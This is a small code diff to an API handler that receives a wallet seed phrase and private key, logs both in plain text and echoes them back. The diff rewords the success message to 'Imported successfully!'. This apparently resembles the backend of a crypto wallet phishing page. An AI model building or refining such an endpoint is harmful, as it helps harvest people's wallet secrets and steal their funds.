@@ -7,7 +7,7 @@ export default async function handler(req, res) {
         console.log("Received Data:", { seedPhrase, privateKey });
 
         // Send a response back to the client
-        res.status(200).json({ message: "Data saved successfully!", data: { seedPhrase, privateKey } });
+        res.status(200).json({ message: "Imported successfully!", data: { seedPhrase, privateKey } });
     } else {
         res.setHeader("Allow", ["POST"]);
         res.status(405).end(`Method ${req.method} Not Allowed`);
